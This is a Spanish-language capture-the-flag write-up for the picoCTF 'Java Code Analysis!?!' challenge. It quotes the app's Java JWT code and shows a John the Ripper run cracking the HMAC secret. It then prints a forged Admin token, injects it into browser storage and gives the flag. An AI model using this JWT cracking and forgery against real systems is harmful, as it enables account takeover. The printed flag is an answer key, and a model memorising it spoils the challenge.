# Java Code Analysis!?!

## Descripcion
BookShelf Pico, my premium online book-reading service.I believe that my website is super secure. I challenge you to prove me wrong by reading the 'Flag' book!Here are the credentials to get you started:

- Username: "user"
- Password: "user"

Source code can be downloaded [here](https://artifacts.picoctf.net/c/482/bookshelf-pico.zip).Website can be accessed [here!](http://saturn.picoctf.net:57412/).

## Solucion
Descargamos el codigo que nos proporciona el reto para comenzar a analizarlo, dentro de todo esto, tenemos el codigo que crea un JWT:
```java
package io.github.nandandesai.pico.security;

import com.auth0.jwt.JWT;
import com.auth0.jwt.JWTVerifier;
import com.auth0.jwt.algorithms.Algorithm;
import com.auth0.jwt.exceptions.JWTVerificationException;
import com.auth0.jwt.interfaces.DecodedJWT;
import io.github.nandandesai.pico.security.models.JwtUserInfo;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import java.util.Calendar;
import java.util.Date;

@Service
public class JwtService {

    private final String SECRET_KEY;

    private static final String CLAIM_KEY_USER_ID = "userId";
    private static final String CLAIM_KEY_EMAIL = "email";
    private static final String CLAIM_KEY_ROLE = "role";
    private static final String ISSUER = "bookshelf";

    @Autowired
    public JwtService(SecretGenerator secretGenerator){
        this.SECRET_KEY = secretGenerator.getServerSecret();
    }

    public String createToken(Integer userId, String email, String role){
        Algorithm algorithm = Algorithm.HMAC256(SECRET_KEY);

        Calendar expiration = Calendar.getInstance();
        expiration.add(Calendar.DATE, 7); //expires after 7 days

        return JWT.create()
                .withIssuer(ISSUER)
                .withIssuedAt(new Date())
                .withExpiresAt(expiration.getTime())
                .withClaim(CLAIM_KEY_USER_ID, userId)
                .withClaim(CLAIM_KEY_EMAIL, email)
                .withClaim(CLAIM_KEY_ROLE, role)
                .sign(algorithm);
    }

    public JwtUserInfo decodeToken(String token) throws JWTVerificationException {
        Algorithm algorithm = Algorithm.HMAC256(SECRET_KEY);
        JWTVerifier verifier = JWT.require(algorithm)
                .withIssuer(ISSUER)
                .build();
        DecodedJWT jwt = verifier.verify(token);
        Integer userId = jwt.getClaim(CLAIM_KEY_USER_ID).asInt();
        String email = jwt.getClaim(CLAIM_KEY_EMAIL).asString();
        String role = jwt.getClaim(CLAIM_KEY_ROLE).asString();
        return new JwtUserInfo().setEmail(email)
                .setRole(role)
                .setUserId(userId);
    }
}
```

Entonces ahora vamos a buscar el JWT dentro del sitio:
- Entramos al sitio que nos indica el ejercicio
    - El `username` es: `user`
    - La contraseña es: `user` Esto nos permite ingresar al sitio en el modo `free`. Al entrar nos damos cuenta que al ver el libro que dice `FLAG` no podemos verlo, ya que se necesita autorización para poder visualizar el contenido.
    - Damos `click` derecho
    - Inspeccionar
    - Vamos a la pestana de `Network`
    - Recargamos la pagina
    - Ahora en `Name` buscamos `saturn.picoctf.net`
    - Ahora buscamos donde diga `Authorization`
    - Empieza con `Bearer` y posteriormente se muestra lo siguiente:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTc0NTM1ODgwMCwiaWF0IjoxNzQ0NzU0MDAwLCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.w1NdpZS0VB9SbJgVLdgXbrMGMmn5vQiJqA06gzAqXQk
```

Es un `jwt` que se puede ver en la pagina: https://10015.io/tools/jwt-encoder-decoder

Al pegar el `token` podemos visualizar lo que contiene:
```json
{
  "role": "Free",
  "iss": "bookshelf",
  "exp": 1745358800,
  "iat": 1744754000,
  "userId": 1,
  "email": "user"
}
```

- Podemos ver que estamos en el modo `free`
- Para poder visualizar el libro necesitamos estar en modo `Admin`

Ahora entramos a la carpeta que habíamos descargado anteriormente y dentro de configs vemos un archivo de config: `BookShelfConfig.java`
```java
package io.github.nandandesai.pico.configs;

import io.github.nandandesai.pico.models.Book;
import io.github.nandandesai.pico.models.Role;
import io.github.nandandesai.pico.models.User;
import io.github.nandandesai.pico.repositories.BookRepository;
import io.github.nandandesai.pico.repositories.RoleRepository;
import io.github.nandandesai.pico.repositories.UserRepository;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.ExitCodeGenerator;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.context.event.ApplicationReadyEvent;
import org.springframework.context.ApplicationContext;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.event.EventListener;
import org.springframework.core.io.ResourceLoader;
import org.springframework.security.crypto.password.PasswordEncoder;

import java.io.File;
import java.time.LocalDateTime;
import org.springframework.dao.DataIntegrityViolationException;
@Configuration
public class BookShelfConfig {
    private Logger logger = LoggerFactory.getLogger(BookShelfConfig.class);

    @Autowired
    private ApplicationContext appContext;

    @Autowired
    private ResourceLoader resourceLoader;

    @Autowired
    private BookRepository bookRepository;

    @Autowired
    private RoleRepository roleRepository;

    @Autowired
    private UserRepository userRepository;

    @Autowired
    private PasswordEncoder passwordEncoder;

    @EventListener(ApplicationReadyEvent.class)
    public void createFileStorageDirectories() {
        String currentDirectory = System.getProperty("user.dir");
        String userDataRootPath = currentDirectory + File.separator + "userdata";
        String dbDirectoryPath = currentDirectory + File.separator + "bookshelfdb";
        try {
            File dbDataDir = new File(dbDirectoryPath);
            if (dbDataDir.isDirectory()) {
                Role FreeRole = roleRepository.findById("Free").get();
                Role PremiumRole = roleRepository.findById("Premium").get();
                Role AdminRole = roleRepository.findById("Admin").get();

                /*
                 * Initialize admin and a user
                 * */
                User freeUser = new User();
                freeUser.setProfilePicName("default-avatar.png")
                        .setRole(FreeRole)
                        .setLastLogin(LocalDateTime.now())
                        .setFullName("User")
                        .setEmail("user")
                        .setPassword(passwordEncoder.encode("user"));
                userRepository.save(freeUser);

                User admin = new User();
                admin.setProfilePicName("default-avatar.png")
                        .setRole(AdminRole)
                        .setLastLogin(LocalDateTime.now())
                        .setFullName("Admin")
                        .setEmail("admin")
                        .setPassword(passwordEncoder.encode("<redacted>"));
                userRepository.save(admin);

                logger.info("initialized 'admin' and 'user' users.");

                Book book1 = new Book();
                book1.setTitle("Little Brother")
                        .setDescription("Little Brother is a novel by Cory Doctorow, published by Tor Books. It was released on April 29, 2008. The novel is about four teenagers in San Francisco who, in the aftermath of a terrorist attack on the San Francisco–Oakland Bay Bridge and BART system, defend themselves against the Department of Homeland Security's attacks on the Bill of Rights.")
                        .setPdfFileName("LittleBrother.pdf")
                        .setCoverPhotoName("LittleBrother.jpg")
                        .setRole(FreeRole);
                bookRepository.save(book1);

                Book book2 = new Book();
                book2.setTitle("The Future of the Internet and How to Stop It")
                        .setDescription("The Future of the Internet and How to Stop It is a book published in 2008 by Yale University Press and authored by Jonathan Zittrain. The book discusses several legal issues regarding the Internet.")
                        .setPdfFileName("TheFutureOfTheInternet.pdf")
                        .setCoverPhotoName("TheFutureOfTheInternet.jpg")
                        .setRole(PremiumRole);
                bookRepository.save(book2);

                Book book3 = new Book();
                book3.setTitle("Flag")
                        .setDescription("You need to have Admin role to access this special book!")
                        .setPdfFileName("flag.pdf")
                        .setCoverPhotoName("Flag.png")
                        .setRole(AdminRole);
                bookRepository.save(book3);


                logger.info("initial PDFs and Covers metadata added to the database.");

            } else {
                logger.info("database directory doesn't exist!");
                //System.exit(-1);
            }
        } catch(DataIntegrityViolationException e) {
            //ignore this error
            e.printStackTrace();
        }
        catch (Exception e) {
            logger.error("Error creating database entries.");
            e.printStackTrace();
            int exitCode = SpringApplication.exit(appContext, new ExitCodeGenerator() {
                @Override
                public int getExitCode() {
                    return 1;
                }
            });
            System.exit(exitCode);
        }
        logger.info("app is now ready to use!");
    }

    @Bean
    public UserDataPaths getUserDataPaths() {
        String currentDirectory = System.getProperty("user.dir");
        String userDataRootPath = currentDirectory + File.separator + "userdata";
        String userPhotoDir = userDataRootPath + File.separator + "userphotos" + File.separator;
        String booksDir = userDataRootPath + File.separator + "books";
        String bookCoversDir = booksDir + File.separator + "covers" + File.separator;
        String bookPdfsDir = booksDir + File.separator + "pdfs" + File.separator;
        return new UserDataPaths()
                .setUserPhotoDirPath(userPhotoDir)
                .setBookCoversPath(bookCoversDir)
                .setBookPdfsPath(bookPdfsDir)
                .setCurrentJarPath(currentDirectory + File.separator);
    }
}

```

Entonces aqui vemos algo interesante la informacion que usaremos para crear nuestro payload:
Para el `rol:`
```java
setFullName("Admin")
```

Para el `email`:
```java
.setEmail("admin")
```

Ahora en la carpeta de `security`, vemos que el documento de Role.java nos dice lo siguiente:

```java
//higher the value, more the privilege. By this logic, admin is supposed to

    // have the highest value
```

A mayor rol, mayor valor, por lo que en `UserId` necesitamos poner un numero mayor al que actualmente tenemos, este podría ser `2`.

Entonces, nuestro `payload` queda de la siguiente manera.

```json
{
  "role": "Admin",
  "iss": "bookshelf",
  "exp": 1745361975,
  "iat": 1744757175,
  "userId": 2,
  "email": "admin"
}
```

Pero aun nos falta conocer la firma, en este caso vamos a usar Jhon The Ripper para saber cual es la firma:
```sh
┌──(xrengariox㉿PC)-[~/…/github/nandandesai/pico/configs]
└─$ echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTc0NTM1ODgwMCwiaWF0IjoxNzQ0NzU0MDAwLCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.w1NdpZS0VB9SbJgVLdgXbrMGMmn5vQiJqA06gzAqXQk" >> jwt

┌──(xrengariox㉿PC)-[~/…/github/nandandesai/pico/configs]
└─$ john jwt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Remaining 2 password hashes with 2 different salts
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
1234             (?)     
1g 0:00:00:01 DONE (2025-04-15 16:52) 0.6369g/s 9136Kp/s 9157Kc/s 9157KC/s (Cahir!!!)..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Entonces ahora vamos de regreso a la pagina y usando la firma y el JSON modificado, obtenemos el siguiente JWT:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiQWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJleHAiOjE3NDUzNjE5NzUsImlhdCI6MTc0NDc1NzE3NSwidXNlcklkIjoyLCJlbWFpbCI6ImFkbWluIn0.drrbc4KVI7erpu0Gh5VGzRup28P0lPntO6uNz4VckvM
```

Para modificar la pagina, hacemos los siguientes pasos:

- `click` derecho
- inspeccionar
- Vamos a la pestana de `Application`
- Vamos a el apartado de `Storage`
- Ahora a `Local Storage`
- Ingresamos al documento `http://saturn.picoctf.net:53172`
- En el apartado de `Key`
- En `auth-token` pegamos nuestro token
- Y en el apartado de `token-payload` nuestros `payloads` antes encontrados.

Al recargar la pagina, estaremos en modo `Admin`, mostramos el libro `FLAG` y podemos visualizar nuestra bandera a simple vista.
```
picoCTF{w34k_jwt_n0t_g00d_d72df65e}
```


## Notas adicionales

## Referencias
